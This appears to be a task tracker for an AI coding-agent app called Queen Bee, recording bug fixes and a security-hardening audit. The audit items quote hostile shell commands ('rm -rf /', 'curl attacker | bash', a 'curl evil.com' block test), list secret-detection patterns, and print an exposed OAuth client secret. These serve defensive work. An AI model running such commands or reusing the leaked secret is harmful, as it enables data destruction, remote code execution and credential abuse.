# 🐝 QUEEN BEE - GLOBAL STATUS & DISPATCH (GSD)
# Généré par : Architecte Agent
# Date : 2026-02-06
# Source : PRD v3 Ground Truth + Audit Forensique

## 📊 Status Global
- **Phase 0**: COMPLETE (Sound Foundation Established)
- **Phase 1**: COMPLETE (Solo Mode Core Operational)
- **Phase 2**: COMPLETE (Secure Filesystem & Repo Cloner)
- **Phase 3**: COMPLETE (Agentic Capabilities & Swarm Infrastructure)
- **Phase 4**: COMPLETE (Advanced Features & Cupertino Aesthetic)
- **Phase 5**: COMPLETE (Bulletproofing & Codex Parity — Devil's Audit)
- **Claim API**: http://127.0.0.1:3000/api/tasks/claim

## 🔧 PHASE 0: SOUDURE (Semaine 1) — Fix What's Broken
- [DONE] `S-01`: [Backend] Ajouter `.chatStream()` AsyncGenerator à UnifiedLLMService.ts
- [DONE] `S-02`: [Backend] Convertir `/api/chat` de res.json() vers SSE streaming
- [DONE] `S-03`: [Integration] Reconnecter AutonomousRunner à /api/chat et gérer le streaming agent (SSE)
- [DONE] `S-04`: [Frontend] Unifier API_BASE sur le port 3000 partout et supprimer les URL hardcodées
- [DONE] `S-05`: [Backend] Sécuriser ToolExecutor pour qu'il soit exclusivement server-side
- [DONE] `S-06`: [Backend] Migration vers Paths.ts pour tous les chemins de fichiers
- [DONE] `S-07`: [Integration] Propagation des erreurs du ToolExecutor vers l'UI via Socket.io
- [DONE] `S-08`: [Backend] Réparer la boucle de FileWatcher (Backend -> Socket -> UI)
- [DONE] `S-09`: [Frontend] Bugfix: Empêcher l'ajout de projets en double dans le Sidebar
- [DONE] `S-10`: [Configuration] Enforce dynamic model discovery as the default.

## 🚀 PHASE 1: SOLO MODE COMPLET (Semaines 2-4)
- [DONE] `P1-01`: [Frontend] Implémenter le streaming UI (Markdown partiel) dans le Composer
- [DONE] `P1-02`: [Backend] Implémenter le résumé automatique de fin de session (Memory Flush)
- [DONE] `P1-03`: [Frontend] Améliorer le Diff Viewer (Split-pane + Synchronized scrolling)
- [DONE] `P1-04`: [Integration] Intégrer la dictée vocale Whisper (Ctrl+M)
- [DONE] `P1-05`: [Frontend] Ajouter les Security Approvals UI pour les actions sensibles

## 📂 PHASE 2: FILESYSTEM & IPC (Abstraction Couche)
- [DONE] `P2-01`: [Integration] Finaliser l'Hybridation (SystemService switch entre Electron/Web)
- [DONE] `P2-02`: [Backend] Implémenter RepoClonerService utilisant simple-git
- [DONE] `P2-03`: [Backend] CloudFSManager : Jail dans `~/.codex/workspaces`

## 🛠 PHASE 3: AGENTIC CAPABILITIES (Swarm Mode)
- [DONE] `P3-01`: [Backend] ProjectTaskManager : Génération récursive de TASKS.md
- [DONE] `P3-02`: [Backend] Recursive Runner : Boucle Plan -> Execute -> Fix
- [DONE] `P3-03`: [Backend] Automation Scheduler (Visual Cron)
- [DONE] `P3-08`: [Frontend] Inbox Triage System (Sidebar Triage section)
- [DONE] `P3-09`: [Backend] GitHub Sync & Auto-Triage (Issue to Task conversion)
- [DONE] `P3-10`: [Backend] Multi-Forge Support (GitHub/GitLab Adapter)

## 🧠 PHASE 4: ADVANCED FEATURES (Vision & Runtime)
- [DONE] `P4-01`: [Backend] Browser Control / Live Eye (CDP Bridge)
- [DONE] `P4-02`: [Integration] Deep Inspector & Runtime Bridge (React DevTools injection)
- [x] **Feature**: Integrated `AutonomousRunner` to fix Agent "Thinking" loop
- [x] **Feature**: Implemented French Language Support (i18n + Toggle)
- [x] **BugFix**: Resolved 500 errors in `AgenticWorkbench.tsx` and `GlobalCommandBar.tsx`
- [x] **BugFix**: Implemented missing `/api/inbox/list` endpoint
- [x] **Feature**: Enforce Light Theme globally (reverted Dark Theme changes)
  - [x] Fix Automation Dashboard UI
  - [x] Fix InboxPanel (Triage) Theme (Light Mode)
  - [x] Fix Search Button (Connect to Cmd+K)
  - [x] Verify Settings Icon
  - [x] **Feature**: Voice Dictation Language Support (French)
- [x] **Feature**: Project Picker implementation in Agentic Workbench
- [x] **BugFix**: Robust Message Streaming & Thread Persistence
- [x] **BugFix**: Git Diff Guard (10k fake deletions suppressed)
- [x] **Feature**: Split 'Diff' and 'Commit' buttons for better UX
- [x] **Feature**: Premium Split-Pane Diff Visualizer (Multi-file support)
- [x] **BugFix**: Robust Agentic Routing & SSE Parser (Fixes "Chatbot" fallback)
  - Status: **COMPLETED & OPERATIONAL** <!-- id: 415 -->
- [DONE] `P4-10`: [Backend] Account Persistence (Hybrid local+server state sync)

## 🔧 FIXES & IMPROVEMENTS
- [DONE] `FIX-01`: [Frontend] Fix Command Line Interface (CLI) Aesthetic & Functionality
- [DONE] `FIX-02`: [Full-Stack] Fix Diff Viewer Rendering & Alignment Issues
- [DONE] `FEAT-02`: [Frontend] Enhance Commit UX and Integration
- [ ] `BUG-01`: [Integration] Fix Whisper Transcription 500 Error
  - **Description**: User reports a 500 Internal Server Error on `POST /api/voice`. This breaks the Dictation (Ctrl+M) feature.
  - **Error**: `POST http://127.0.0.1:3000/api/voice 500 (Internal Server Error)`
  - **Actions**:
    - Investigate `proxy-bridge/src/server.ts` or the voice route handler.
    - Check for missing environment variables (OPENAI_API_KEY) or FFmpeg issues.
    - Verify `useVoiceRecording.ts` payload structure.
  - **Worker**: BACKEND

## 🛡️ PHASE 5: BULLETPROOFING & CODEX PARITY (Devil's Audit)
> **Source**: Forensic audit of every file. Worst-case analysis.
> **Rule**: ZERO new features. Fix what's broken, remove what's fake, harden what's real.

### 🔴 CRITICAL — Security & Data Integrity

- [DONE] `BP-01`: [Backend] Sandbox `run_shell` in ToolExecutor — add command allowlist + path jail
  - **Files**: `proxy-bridge/src/lib/ToolExecutor.ts` (line 90-92, 306-316)
  - **Problem**: `run_shell` executes ANY command via `exec()` with zero filtering. LLM can inject `rm -rf /`, `curl attacker | bash`, or exfiltrate data.
  - **Fix**: Add command allowlist (git, npm, npx, node, python3, ls, cat, mkdir, cp, mv). Block pipes to curl/wget. Enforce cwd stays inside projectPath. Add max execution timeout (30s).
  - **Validation**: Attempt `run_shell({command: "curl evil.com"})` → should throw `BLOCKED_COMMAND` error.
  - **Worker**: BACKEND
  - **Estimate**: 2h

- [DONE] `BP-02`: [Backend] Remove hardcoded OAuth secrets from source code
  - **Files**: `proxy-bridge/src/lib/auth-manager.ts` (lines 12-13)
  - **Problem**: `ANTIGRAVITY_CLIENT_ID` and `ANTIGRAVITY_CLIENT_SECRET` ("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f") are HARDCODED in source. This is a credential leak in a public repo.
  - **Fix**: Move to `.env` only. Remove fallback values. Fail with clear error if env vars missing. Rotate the exposed secret immediately.
  - **Validation**: `grep -r "GOCSPX" proxy-bridge/src/` → zero matches.
  - **Worker**: BACKEND
  - **Estimate**: 1h

- [DONE] `BP-03`: [Backend] Remove `skipAudit` bypass from commit endpoint
  - **Files**: `proxy-bridge/src/pages/api/git/commit.ts` (line 13)
  - **Problem**: Any caller can pass `skipAudit: true` to bypass SecurityAuditAgent. This defeats the entire pre-commit security scan.
  - **Fix**: Remove `skipAudit` parameter entirely. Security audit is ALWAYS enforced. If a legitimate bypass is needed, require a signed token from the UI approval flow.
  - **Validation**: `POST /api/git/commit` with `skipAudit: true` and a file containing `sk-test1234567890abcdef` → should still return 422.
  - **Worker**: BACKEND
  - **Estimate**: 1h

### 🟠 HIGH — Mock Data & Dead Code Removal

- [DONE] `BP-04`: [Backend] Remove mock data seeding from InboxManager
  - **Files**: `proxy-bridge/src/lib/InboxManager.ts` (lines 32-58)
  - **Problem**: When `inbox.json` doesn't exist, `getFindings()` returns 3 fake alerts ("Potential Secrets Detected", "Redundant Re-renders", "Circular Dependency Found"). Users see fake security warnings in production.
  - **Fix**: Return empty array `[]` when inbox.json doesn't exist. Create the file lazily on first real finding.
  - **Validation**: Delete `~/.codex/data/inbox.json` → `GET /api/inbox/list` returns `[]`.
  - **Worker**: BACKEND
  - **Estimate**: 30m

- [DONE] `BP-05`: [Frontend] Replace mock RealTimeLogFeed with real socket connection
  - **Files**: `dashboard/src/components/layout/RealTimeLogFeed.tsx`
  - **Problem**: Entire component is fake. Uses `setInterval` to generate fake log lines every 3s. Never connects to any real log stream. Also uses `slate` palette (violates design system).
  - **Fix**: Connect to socket.io `LOG_RELAY` events. Show real backend logs. Replace `slate` with `zinc`. Show empty state when no logs.
  - **Validation**: Open RealTimeLogFeed → see actual backend log events, not fake timestamps.
  - **Worker**: FRONTEND
  - **Estimate**: 2h

- [DONE] `BP-06`: [Frontend] Fix hardcoded API_BASE in LoginPage.tsx
  - **Files**: `dashboard/src/components/auth/LoginPage.tsx` (line 10)
  - **Problem**: `const API_BASE = 'http://127.0.0.1:3000'` is declared locally instead of importing from `useAppStore`. If API_BASE changes, LoginPage breaks silently.
  - **Fix**: Import `API_BASE` from `../store/useAppStore` or `../../services/api`. Remove local declaration.
  - **Validation**: `grep -n "const API_BASE" dashboard/src/components/` → zero matches (only store should define it).
  - **Worker**: FRONTEND
  - **Estimate**: 15m

### 🟡 MEDIUM — Streaming Resilience & Reliability

- [DONE] `BP-07`: [Backend] Add SSE heartbeat + timeout to /api/chat streaming
  - **Files**: `proxy-bridge/src/pages/api/chat.ts`
  - **Problem**: SSE stream has no keepalive ping. If LLM takes >60s between chunks, proxies/browsers may drop the connection. No `[DONE]` terminal event on the standard stream path. No client disconnect detection.
  - **Fix**: Send `:heartbeat\n\n` comment every 15s during streaming. Add `req.on('close')` handler to abort LLM call on client disconnect. Always send `data: [DONE]\n\n` before `res.end()`. Add 5-minute max timeout.
  - **Validation**: Start long stream → observe heartbeat pings in DevTools every 15s. Close browser tab → server logs "client disconnected, aborting".
  - **Worker**: BACKEND
  - **Estimate**: 2h

- [ ] `BP-08`: [Frontend] Add SSE retry + error recovery in chat streaming
  - **Files**: `dashboard/src/services/api.ts`, `dashboard/src/components/layout/AgenticWorkbench.tsx`
  - **Problem**: If SSE stream drops mid-response, UI likely shows partial message with no error indicator. No retry logic. User must manually re-send.
  - **Fix**: Detect stream drop (ReadableStream error / incomplete JSON). Show "Connection lost — retry?" banner. Auto-retry once with exponential backoff. Mark partial messages visually.
  - **Validation**: Kill backend mid-stream → UI shows error banner with retry button, not silent hang.
  - **Worker**: FRONTEND
  - **Estimate**: 3h

### 🔵 CODEX PARITY — UX Features

- [ ] `BP-09`: [Frontend] Add agent step/plan panel showing tool execution progress
  - **Files**: `dashboard/src/components/agents/ToolCallViewer.tsx`, `dashboard/src/components/layout/AgenticWorkbench.tsx`
  - **Problem**: Codex shows a clear step-by-step panel ("Reading file...", "Writing code...", "Running tests...") with running/done/failed states. Queen Bee shows tool calls inline in chat but lacks a persistent progress sidebar.
  - **Fix**: Add a collapsible "Agent Steps" panel in AgenticWorkbench that aggregates TOOL_EXECUTION and TOOL_RESULT socket events into a timeline view with status icons.
  - **Validation**: Send a multi-tool prompt → see step panel update in real-time with running spinners and success/fail indicators.
  - **Worker**: FRONTEND
  - **Estimate**: 4h

- [ ] `BP-10`: [Integration] Wire Deep Inspector to real runtime data or show honest empty state
  - **Files**: `proxy-bridge/src/lib/EventLoopManager.ts` (lines 123-136), `dashboard/src/components/inspector/InspectorPanel.tsx`
  - **Problem**: RUNTIME_QUERY just re-broadcasts to all clients. There's no actual React DevTools hook injection or component tree extraction. Inspector shows nothing useful.
  - **Fix (Option A)**: Wire to actual Vite plugin that injects `__REACT_DEVTOOLS_GLOBAL_HOOK__` and extracts component tree. OR **Fix (Option B)**: Show honest "Inspector not connected — start your app with Queen Bee Dev Server to enable" message instead of mock/empty UI.
  - **Validation**: Open Inspector panel → either see real component tree from running app, or see clear "not connected" message.
  - **Worker**: INTEGRATION
  - **Estimate**: 4h (Option B: 1h)

- [DONE] `BP-11`: [Backend] Enhance SecurityAuditAgent with more patterns + .env detection
  - **Files**: `proxy-bridge/src/lib/SecurityAuditAgent.ts`
  - **Problem**: Only detects 5 specific key patterns. Misses AWS keys, Stripe keys, JWT secrets, database URLs, .env files with secrets, private SSH keys.
  - **Fix**: Add patterns for AWS (`AKIA`), Stripe (`sk_live_`), generic `password=`, `DATABASE_URL=`, `PRIVATE KEY`. Also scan for `.env` files accidentally staged. Log findings to InboxManager for triage.
  - **Validation**: Stage a file with `AKIA1234567890EXAMPLE` → commit blocked with finding details.
  - **Worker**: BACKEND
  - **Estimate**: 2h

- [ ] `BP-12`: [Backend] Add request correlation IDs across API + Socket events
  - **Files**: `proxy-bridge/src/middleware.ts`, `proxy-bridge/src/lib/socket-instance.ts`, `proxy-bridge/src/lib/logger.ts`
  - **Problem**: Errors log without request context. Debugging production issues requires correlating API calls → tool executions → socket events, but there's no shared ID.
  - **Fix**: Generate `X-Request-Id` (uuid) in middleware. Pass through to ToolExecutor, AutonomousRunner, and all socket broadcasts. Include in all log lines.
  - **Validation**: Make API call → check logs → all related entries share same request ID.
  - **Worker**: BACKEND
  - **Estimate**: 2h

### 🟣 WAVE 2 — Audit Deep Dive Findings

- [DONE] `BP-13`: [Frontend] Remove mock data from AutomationDashboard ExecutionLog
  - **Files**: `dashboard/src/components/layout/AutomationDashboard.tsx` (lines 219-224, 314)
  - **Problem**: Hardcoded fake execution history (`{id:1, name:'GSD Sync', status:'success'...}`). Line 314 hardcodes `lastRunStatus="success"` for ALL cards regardless of actual state.
  - **Fix**: Fetch real execution history from automation API or show empty state. Derive lastRunStatus from actual job data.
  - **Worker**: FRONTEND
  - **Estimate**: 2h

- [DONE] `BP-14`: [Integration] Wire DIFF_UPDATE and FILE_CHANGE socket events to UI
  - **Files**: `dashboard/src/hooks/useSocketEvents.ts`
  - **Problem**: Backend broadcasts DIFF_UPDATE and FILE_CHANGE events but frontend ignores them. UI requires manual refresh to see file changes. Only 6 events subscribed.
  - **Fix**: Add socket listeners for DIFF_UPDATE and FILE_CHANGE. Update useHiveStore with file change data. Trigger diff panel refresh on DIFF_UPDATE.
  - **Worker**: INTEGRATION
  - **Estimate**: 2h

- [DONE] `BP-15`: [Frontend] Fix GlobalCommandBar to actually execute actions
  - **Files**: `dashboard/src/components/layout/GlobalCommandBar.tsx`
  - **Problem**: Cmd+K has 3 hardcoded actions that only `console.log`. None actually work. Users get a polished UI that does nothing.
  - **Fix**: Wire "Spawn New Agent" to thread creation flow. Wire "Switch Project" to project selector. Wire "System Status" to health check. Add file/component search via backend API.
  - **Worker**: FRONTEND
  - **Estimate**: 3h

- [DONE] `BP-16`: [Frontend] Centralize all hardcoded URLs across frontend
  - **Files**: `dashboard/src/store/useHiveStore.ts` (8 instances), `dashboard/src/components/layout/InboxPanel.tsx` (2 instances), `dashboard/src/components/layout/Sidebar.tsx` (2 instances)
  - **Problem**: 12+ hardcoded `http://127.0.0.1:3000` URLs scattered across components instead of using centralized `API_BASE` from `services/api.ts`.
  - **Fix**: Import and use `API_BASE` from `services/api.ts` in all affected files.
  - **Worker**: FRONTEND
  - **Estimate**: 1h

- [DONE] `BP-17`: [Backend] Remove mock response from RuntimeBridge.ts
  - **Files**: `proxy-bridge/src/lib/RuntimeBridge.ts`
  - **Problem**: `inspectElement()` returns hardcoded mock data (`{file: 'src/components/Header.tsx', line: 42}`). Feature is non-functional.
  - **Fix**: Return `null` with `{ connected: false }` status when no real runtime is attached. Only return real data when a target app has registered via socket.
  - **Worker**: BACKEND
  - **Estimate**: 1h

- [DONE] `BP-18`: [Backend] Secure credential injection endpoint
  - **Files**: `proxy-bridge/src/pages/api/auth/github/setup.ts` (lines 56-57)
  - **Problem**: Any client can POST GitHub credentials into `process.env` with no validation. If another endpoint logs `process.env`, secrets leak.
  - **Fix**: Validate credentials by making a test API call before storing. Restrict endpoint to localhost-only requests. Store in secure config file instead of process.env.
  - **Worker**: BACKEND
  - **Estimate**: 2h

- [DONE] `BP-19`: [Backend] Add sensitive data redaction to logger
  - **Files**: `proxy-bridge/src/lib/logger.ts` (line 28)
  - **Problem**: Logger `JSON.stringify()`s arbitrary objects to disk. Tool results containing API keys, tokens, or passwords are logged in plaintext.
  - **Fix**: Add redaction filter that masks patterns matching `sk-*`, `ghp_*`, `AKIA*`, `password`, `secret`, `token`, `Bearer *` before writing to log file.
  - **Worker**: BACKEND
  - **Estimate**: 1h
